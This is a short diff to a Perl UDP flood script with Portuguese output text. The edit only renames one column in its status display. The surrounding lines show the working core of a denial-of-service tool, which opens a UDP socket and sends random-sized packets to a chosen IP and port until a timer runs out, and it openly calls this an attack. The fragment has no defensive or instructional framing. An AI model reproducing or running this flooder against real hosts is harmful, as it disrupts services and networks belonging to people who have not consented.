@@ -14,7 +14,7 @@ $iaddr = inet_aton("$ip") or die "erro!\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 print "~para cancelar o ataque aperte \'Ctrl-C\'\n\n";
-print "|IP|\t\t |Porta|\t\t |pacote|\t\t |Tempo|\n";
+print "|IP|\t\t |Porta|\t\t |Mb|\t\t |Tempo|\n";
 print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1500-64)+64) ;
